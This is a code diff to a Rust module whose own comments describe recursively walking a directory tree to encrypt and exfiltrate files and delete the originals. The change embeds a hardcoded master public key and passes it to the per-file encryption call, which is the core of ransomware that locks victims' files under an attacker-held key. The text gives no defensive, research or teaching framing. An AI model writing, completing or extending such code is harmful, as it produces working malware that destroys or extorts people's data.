@@ -1,15 +1,16 @@
 //! A module for recursively walking a directory tree, processing
 //! files (encrypt, decrypt, exfiltrate), and deleting original files.
 
-use log::{debug, info};
 use std::collections::HashSet;
 // use std::fs;  // for file deletion
 use std::io::{self, ErrorKind};
 use std::path::Path;
+
+use log::{debug, info};
 use walkdir::WalkDir;
 
 use crate::{
-    crypto::{EXTENSION, decrypt, encrypt},
+    crypto::{EXTENSION, b64_decode, decrypt, encrypt},
     error::AppError,
 };
 
@@ -45,6 +46,8 @@ const EXCLUDED_FILES: &'static [&'static str] = &[
     ".swo",
 ];
 
+const MASTER_PUBLIC_KEY_B64: &str = "CDwCVxtIpZuAKzESg+9DZ7JmhSpN8iRN1iCpmHU4W0U";
+
 /// Walks a directory tree starting from `path`, excluding directories
 /// and files based on predefined lists, and encrypts and exfiltrates
 /// files. It's like a spores burst--sporulate.
@@ -75,6 +78,7 @@ pub fn sporulate(
     }
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
+    let master_public_key_bytes = b64_decode(MASTER_PUBLIC_KEY_B64)?;
 
     // Iterator creation and customization: Takes a path and creates a lazy
     // iterator that traverses the directory tree--only scans the file system
@@ -131,7 +135,7 @@ pub fn sporulate(
 
             // Encrypt enters here
             debug!("Encrypting file: {:?}", file_path);
-            encrypt(file_path)?;
+            encrypt(file_path, &master_public_key_bytes)?;
             // TODO: Possibly, I'll have to handle errors at this
             // level to prevent from breaking when encryption fails:
             // match encrypt() {
